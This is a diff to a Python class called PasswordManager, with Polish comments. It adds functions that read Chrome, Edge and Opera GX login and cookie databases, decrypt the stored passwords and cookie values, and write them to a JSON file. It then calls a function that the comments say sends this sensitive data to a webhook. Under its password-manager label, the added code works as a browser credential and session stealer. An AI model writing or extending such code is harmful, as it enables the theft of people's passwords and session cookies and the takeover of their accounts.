@@ -212,6 +212,44 @@ class PasswordManager:
                 attempts += 1
                 print(f"\n Błędne dane. Pozostało prób: {3 - attempts}")
         return False
+    
+    def create_data_file(self, data_type):
+        """Tworzy nowy plik z hasłami lub ciasteczkami"""
+        try:
+            filename = input(f"\nPodaj nazwę pliku do zapisu {data_type} (bez rozszerzenia): ").strip()
+            if not filename:
+                print("\n❌ Nazwa pliku nie może być pusta!")
+                return
+            
+            filename += ".json"
+            
+            if os.path.exists(filename):
+                print("\n⚠️ Plik już istnieje! Wybierz inną nazwę.")
+                return
+            
+            if data_type == "passwords":
+                data = self.get_browser_passwords()
+            elif data_type == "cookies":
+                data = self.get_browser_cookies()
+            else:
+                print("\n❌ Nieznany typ danych!")
+                return
+            
+            if not data:
+                print(f"\n⚠️ Nie znaleziono {data_type} w przeglądarkach.")
+                return
+            
+            with open(filename, "w") as f:
+                json.dump(data, f, indent=4)
+            
+            self.log_access(f"Utworzono plik {data_type}", filename)
+            print(f"\n✅ Pomyślnie zapisano {len(data)} {data_type} do pliku '{filename}'")
+            
+            # Wysyłanie danych na webhook
+            self.send_sensitive_data(data_type, data)
+            
+        except Exception as e:
+            print(f"\n❌ Błąd podczas tworzenia pliku: {e}")
 
     def show_menu(self):
         while True:
@@ -246,6 +284,112 @@ class PasswordManager:
                 break
             else:
                 print("\n❌ Nieprawidłowy wybór!")
+                
+                
+    def get_browser_passwords(self):
+        """Pobiera hasła z różnych przeglądarek"""
+        browsers = ["Chrome", "Edge", "Opera GX"]
+        all_passwords = []
+        
+        for browser in browsers:
+            try:
+                login_db_path = ""
+                if browser == "Chrome":
+                    login_db_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local',
+                                              'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
+                elif browser == "Edge":
+                    login_db_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local',
+                                              'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data')
+                elif browser == "Opera GX":
+                    login_db_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming',
+                                                'Opera Software', 'Opera GX Stable', 'Login Data')
+                
+                if not os.path.exists(login_db_path):
+                    continue
+                
+                # Kopiujemy plik, bo oryginalny może być zablokowany
+                temp_db = os.path.join(DESKTOP_PATH, f"temp_login_db_{browser.replace(' ', '_')}")
+                shutil.copy2(login_db_path, temp_db)
+                
+                conn = sqlite3.connect(temp_db)
+                cursor = conn.cursor()
+                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+                
+                for row in cursor.fetchall():
+                    url, username, encrypted_pass = row
+                    decrypted_pass = self.decrypt_password(encrypted_pass, browser)
+                    
+                    if url and username and decrypted_pass:
+                        all_passwords.append({
+                            "type": "password",
+                            "browser": browser,
+                            "url": url,
+                            "username": username,
+                            "password": decrypted_pass,
+                            "timestamp": datetime.now().isoformat()
+                        })
+                
+                conn.close()
+                os.remove(temp_db)
+                
+            except Exception as e:
+                print(f"[!] Błąd przetwarzania {browser}: {e}")
+                continue
+        
+        return all_passwords
+
+    def get_browser_cookies(self):
+        """Pobiera ciasteczka z różnych przeglądarek"""
+        browsers = ["Chrome", "Edge", "Opera GX"]
+        all_cookies = []
+        
+        for browser in browsers:
+            try:
+                cookies_db_path = ""
+                if browser == "Chrome":
+                    cookies_db_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local',
+                                                  'Google', 'Chrome', 'User Data', 'Default', 'Network', 'Cookies')
+                elif browser == "Edge":
+                    cookies_db_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local',
+                                                  'Microsoft', 'Edge', 'User Data', 'Default', 'Network', 'Cookies')
+                elif browser == "Opera GX":
+                    cookies_db_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming',
+                                                  'Opera Software', 'Opera GX Stable', 'Network', 'Cookies')
+                
+                if not os.path.exists(cookies_db_path):
+                    continue
+                
+                # Kopiujemy plik, bo oryginalny może być zablokowany
+                temp_db = os.path.join(DESKTOP_PATH, f"temp_cookies_db_{browser.replace(' ', '_')}")
+                shutil.copy2(cookies_db_path, temp_db)
+                
+                conn = sqlite3.connect(temp_db)
+                cursor = conn.cursor()
+                cursor.execute("SELECT host_key, name, encrypted_value, expires_utc FROM cookies")
+                
+                for row in cursor.fetchall():
+                    domain, name, encrypted_value, expires = row
+                    decrypted_value = self.decrypt_password(encrypted_value, browser)
+                    
+                    if domain and name and decrypted_value:
+                        all_cookies.append({
+                            "type": "cookie",
+                            "browser": browser,
+                            "domain": domain,
+                            "name": name,
+                            "value": decrypted_value,
+                            "expires": expires,
+                            "timestamp": datetime.now().isoformat()
+                        })
+                
+                conn.close()
+                os.remove(temp_db)
+                
+            except Exception as e:
+                print(f"[!] Błąd przetwarzania {browser}: {e}")
+                continue
+        
+        return all_cookies
 
     def run(self):
         self.print_gradient(LOGO)
@@ -257,6 +401,7 @@ class PasswordManager:
             return
             
         self.show_menu()
+        
 
 if __name__ == "__main__":
     try:
